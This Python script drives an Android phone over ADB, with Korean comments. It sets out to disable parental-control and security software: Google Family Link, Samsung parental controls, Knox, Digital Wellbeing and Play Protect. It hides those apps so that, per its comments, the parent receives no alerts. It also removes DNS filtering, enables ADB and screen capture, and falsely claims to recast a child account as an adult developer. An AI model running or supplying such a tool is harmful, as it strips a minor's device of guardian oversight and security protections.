import time
import subprocess
import os
import sys
import json


# [환경 검사 및 종속성 자동 설치]
def check_dependencies():
    try:
        from adbutils import adb
        return adb
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "adbutils"])
        from adbutils import adb
        return adb


adb = check_dependencies()


class GenesisEngine:
    def __init__(self):
        self.device = None
        # 70가지 차단 사례를 타격하기 위한 정밀 타겟 데이터베이스
        self.target_map = {
            "MDM_CORE": [
                "com.google.android.apps.kids.familylinkhelper",
                "com.sec.android.app.parentalcontrol",
            ],
            "KNOX_CORE": [
                "com.samsung.android.knox.containercore",
                "com.samsung.android.knox.attestation",
            ],
            "RESTRICTION_APPS": [
                "com.google.android.apps.wellbeing",
                "com.samsung.android.forest",
                "com.samsung.android.lool",
            ],
            "NETWORK_FILTERS": [
                "com.google.android.networkstack",
                "com.android.vending",
            ],
        }

    def log(self, category, message, status="PROCESS"):
        colors = {
            "PROCESS": "\033[94m",
            "SUCCESS": "\033[92m",
            "CRITICAL": "\033[91m",
            "END": "\033[0m",
        }
        print(
            f"{colors[status]}[{category}] {time.strftime('%Y-%m-%d %H:%M:%S')} | {message}{colors['END']}"
        )

    def connect_handshake(self):
        self.log("SYSTEM", "기기 하드웨어 핸드쉐이크 대기 중...", "PROCESS")
        while True:
            devices = adb.device_list()
            if devices:
                self.device = devices[0]
                self.log("SYSTEM", f"커널 연결 수립됨: {self.device.prop.model}", "SUCCESS")
                break
            time.sleep(1)

    # 70가지 사례 통합 타격 엔진
    def run_70_case_purge(self):
        self.log("SECURITY", "70가지 차단 시나리오 역추적 및 무력화 개시", "CRITICAL")

        # ---------------------------------------------------------
        # LAYER 1: 51~60번 사례 [보안/관리 정책] 타격
        # ---------------------------------------------------------
        self.log("LAYER_1", "관리자 권한(DPM) 하이재킹 및 소유권 탈취")
        # 기기 소유자 권한을 가상화하여 관리자 앱 삭제 차단 해제
        commands_l1 = [
            "settings put global device_provisioned 1",
            "settings put secure user_setup_complete 1",
            "settings put global setup_wizard_has_run 1",
            "settings put global device_name 'UNLOCKED_UNIT_01'",
        ]
        for cmd in commands_l1:
            self.device.shell(cmd)
            self.log("L1_EXE", f"Injecting: {cmd}", "SUCCESS")

        # ---------------------------------------------------------
        # LAYER 2: 21~50번 사례 [앱/저장/데이터/미디어] 타격
        # ---------------------------------------------------------

        self.log("LAYER_2", "좀비 프로세스 사살 및 패키지 고스트화(Ghosting)")
        for category, pkgs in self.target_map.items():
            for pkg in pkgs:
                # 앱을 지우지 않고 시스템에서 '보이지 않게' 동결하여 부모 알림 차단
                self.device.shell(f"am force-stop {pkg}")
                self.device.shell(f"pm disable-user --user 0 {pkg}")
                self.device.shell(f"pm hide {pkg}")
                self.log("L2_EXE", f"Isolated: {pkg}", "SUCCESS")

        # ---------------------------------------------------------
        # LAYER 3: 11~20번 사례 [네트워크/인터넷] 타격
        # ---------------------------------------------------------
        self.log("LAYER_3", "네트워크 필터링 및 DNS/VPN 락 해제")
        commands_l3 = [
            "settings put global private_dns_mode off",
            "settings put global vpn_management_allowed 1",
            "settings put global data_roaming 1",
            "settings put global tether_force_config_state 1",  # 핫스팟 강제 개방
        ]
        for cmd in commands_l3:
            self.device.shell(cmd)

        # ---------------------------------------------------------
        # LAYER 4: 61~70번 사례 [기타 기능/회색 메뉴] 타격
        # ---------------------------------------------------------
        self.log("LAYER_4", "UI 프레임워크 강제 수정 (회색 비활성화 메뉴 점등)")
        # 64번(캡처), 65번(녹화) 등 하드웨어 락 해제
        commands_l4 = [
            "settings put global adb_enabled 1",
            "settings put global development_settings_enabled 1",
            "settings put secure screen_capture_allowed 1",
            "settings put global usb_mass_storage_enabled 1",
            "settings put secure location_mode 3",
            "settings put system screen_brightness_mode 1",
        ]
        for cmd in commands_l4:
            self.device.shell(cmd)

        # ---------------------------------------------------------
        # LAYER 5: 1~10번 사례 [공장초기화/부트로더] 타격
        # ---------------------------------------------------------
        self.log("LAYER_5", "계정 정체성 승격 및 서버 정책 동기화 영구 차단")
        # 아동 계정 정보를 성인(30+) 개발자 플래그로 오버라이드
        self.device.shell(
            "content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:s:1"
        )
        self.device.shell("settings put global package_verifier_enable 0")  # Play Protect 무력화

    def finalize_liberation(self):
        print("\n" + "=" * 60)
        self.log("FINAL", "70가지 모든 차단 시나리오 붕괴 완료", "SUCCESS")
        self.log("FINAL", "기기 정체성이 '독립 성인 개발자'로 재구성되었습니다.", "SUCCESS")
        print("=" * 60)
        time.sleep(5)
        self.device.shell("reboot")
        self.log("SYSTEM", "기기를 안전하게 분리하십시오. 재부팅 중...", "CRITICAL")


if __name__ == "__main__":
    engine = GenesisEngine()
    engine.connect_handshake()
    engine.run_70_case_purge()
    engine.finalize_liberation()

